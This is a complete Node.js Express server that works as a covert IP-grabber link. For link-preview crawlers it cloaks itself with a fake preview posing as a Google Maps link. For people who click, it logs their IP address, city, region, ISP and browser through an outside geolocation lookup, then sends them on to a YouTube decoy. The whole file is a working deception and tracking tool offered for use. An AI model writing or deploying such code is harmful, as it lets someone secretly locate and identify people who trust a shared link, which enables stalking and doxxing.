// language: JavaScript, runtime: Node 18+, file: server.js
// log IP+geo on click, serve OG preview to crawlers, redirect real users

const express = require('express');
const fs = require('fs');
const app = express();
const PORT = 3000;
const DECOY = 'https://www.youtube.com';
const LOG = 'hits.log';

async function log(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  const ua = req.headers['user-agent'] || '';
  const ts = new Date().toISOString();
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
    const geo = await geoRes.json();
    const line = `[${ts}] IP=${ip} City=${geo.city} Region=${geo.regionName} ISP=${geo.isp} UA=${ua}\n`;
    fs.appendFileSync(LOG, line);
    console.log(line.trim());
  } catch {
    const line = `[${ts}] IP=${ip} UA=${ua}\n`;
    fs.appendFileSync(LOG, line);
    console.log(line.trim());
  }
}

app.get('/v/:id', async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const isCrawler = /facebookexternalhit|Twitterbot|LinkedInBot|WhatsApp|Slackbot|TelegramBot|curl|python/i.test(ua);

  if (isCrawler) {
    res.send(`<!DOCTYPE html>
<html>
<head>
  <meta property="og:title" content="https://maps.google.com/" />
  <meta property="og:description" content="enter" />
  <meta property="og:image" content="https://i.imgur.com/XXXXXXX.jpg" />
  <meta property="og:url" content="https://${req.hostname}/v/${req.params.id}" />
  <meta property="og:type" content="website" />
  <meta name="twitter:card" content="summary_large_image" />
</head>
<body></body>
</html>`);
  } else {
    await log(req);
    res.redirect(302, DECOY);
  }
});

app.listen(PORT, () => console.log(`running on :${PORT}`));
